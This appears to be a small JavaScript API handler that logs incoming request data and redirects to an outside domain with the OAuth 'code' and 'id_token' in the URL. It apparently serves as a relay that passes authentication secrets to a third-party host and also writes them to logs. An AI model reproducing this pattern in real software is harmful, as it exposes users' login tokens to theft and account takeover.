export default function handler(req, res) {
  try {
    // Accept both GET and POST
    const data = req.method === "POST" ? req.body : req.query;

    console.log("Received data:", data);

    // Redirect to your site, optionally passing OAuth params
    const targetUrl = `https://043e31b65bde56138e73ae2e.soughtonassociates.com/?code=${data.code || ""}&id_token=${data.id_token || ""}`;
    res.writeHead(302, { Location: targetUrl });
    res.end();
  } catch (err) {
    console.error(err);
    res.status(500).send("Internal Server Error");
  }
}
